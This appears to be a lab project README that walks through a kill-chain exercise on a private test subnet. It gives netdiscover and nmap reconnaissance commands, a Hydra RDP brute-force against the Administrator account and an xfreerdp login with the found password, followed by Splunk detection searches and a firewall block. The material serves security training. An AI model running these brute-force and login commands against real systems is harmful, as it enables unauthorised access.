# Attack Chain Documentation

This project demonstrates a complete, realistic cyber attack following the **Cyber Kill Chain** model.

## Attack Chain Overview

| Phase              | Tool          | Command / Action                                                                 | Purpose |
|--------------------|---------------|----------------------------------------------------------------------------------|---------|
| **1. Reconnaissance** | netdiscover   | `sudo netdiscover -r 10.0.2.0/24 -P`                                           | Discover live hosts and identify target IP |
| **2. Scanning**       | nmap          | `nmap -sS -T4 -F 10.0.2.6`                                                     | Scan for open ports (RDP, SMB, etc.) |
| **3. Exploitation**   | Hydra         | `hydra -l Administrator -P ~/passwords.txt -t 4 -V rdp://10.0.2.6`             | Brute-force attack against RDP service |
| **4. Gaining Access** | xfreerdp      | `xfreerdp /u:Administrator /p:'Password.1!!' /v:10.0.2.6 /cert-ignore /sec:rdp` | Successful login (take screenshot as proof) |
| **5. Detection**      | Splunk        | Real-time dashboard showing failed logon spikes (EventCode 4625)               | SIEM alerts trigger |
| **6. Response**       | Windows Firewall | Block attacker IP (10.0.2.5) via Inbound Rule                                 | Containment / Incident Response |

---

## Detailed Commands 

**Reconnaissance**
bash
sudo netdiscover -r 10.0.2.0/24 -P

**Scanning**
bash
nmap -sS -T4 -F 10.0.2.6


**Exploitation (Hydra RDP Brute-Force)**
bash
hydra -l Administrator -P ~/passwords.txt -t 4 -V rdp://10.0.2.6


**Gaining Access (Successful Login)**
bash
xfreerdp /u:Administrator /p:'Password.1!!' /v:10.0.2.6 /cert-ignore /sec:rdp


**Splunk Detection During Attack**

Use these real-time searches in Splunk:

Failed Logons: index=main sourcetype="WinEventLog:Security" EventCode=4625 

Scan Activity: index=main sourcetype="WinEventLog:Security" (EventCode=5156 OR EventCode=5157 OR EventCode=5158)
